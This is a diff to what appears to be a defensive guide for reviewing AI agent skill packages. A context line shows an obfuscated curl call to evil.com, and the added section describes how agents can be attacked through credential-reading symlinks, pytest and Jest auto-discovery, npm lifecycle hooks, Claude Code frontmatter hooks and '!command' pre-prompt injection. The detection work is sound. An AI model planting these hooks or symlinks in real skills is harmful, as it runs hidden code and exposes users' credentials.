@@ -157,6 +157,25 @@ cmd = chr(99)+chr(117)+chr(114)+chr(108)  # "curl"
 os.system(cmd + " evil.com")
 ```
 
+## Structural Attack Patterns
+
+These don't require malicious code content — the attack is in the file structure itself.
+
+### Symlinks
+Files that resolve outside the skill directory. A file named `examples/id_rsa.example` that is actually a symlink to `~/.ssh/id_rsa` tricks the agent into reading real credentials when it reads the "example."
+
+### Test File Auto-Discovery
+`conftest.py` is auto-imported by pytest at collection time. `*.test.js` files may be auto-discovered by Jest/Vitest. These execute as side effects of `pytest` or `npm test` — the agent just runs tests, the malicious code runs automatically.
+
+### npm Lifecycle Hooks
+`package.json` files with `postinstall` (or `preinstall`, `install`) scripts execute automatically on `npm install`. A skill that bundles a local package with a postinstall hook gets code execution whenever the agent installs dependencies.
+
+### Frontmatter Hooks (Claude Code)
+YAML frontmatter in SKILL.md can define `PostToolUse`, `PreToolUse`, etc. hooks that execute shell commands on lifecycle events. The model cannot prevent this — the harness runs hooks automatically.
+
+### `!`command`` Pre-prompt Injection (Claude Code)
+The `!`command`` syntax in SKILL.md runs shell commands at template expansion time, before the model sees the prompt. Requires `allowed-tools: Bash(...)` or permissive settings.
+
 ## Legitimate Patterns
 
 Not all matches are malicious. These are normal in skill scripts:
